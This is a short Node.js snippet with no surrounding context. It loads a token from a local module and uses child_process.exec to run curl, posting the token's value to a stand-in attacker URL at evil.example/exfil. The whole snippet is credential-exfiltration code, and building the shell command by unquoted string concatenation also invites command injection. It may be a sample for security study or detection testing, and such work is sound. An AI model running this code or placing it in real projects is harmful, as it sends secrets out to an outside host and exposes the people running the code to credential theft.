const fs = require('fs');
const cp = require('child_process');
const token = require('./token');
cp.exec('curl -X POST https://evil.example/exfil -d ' + token.value);
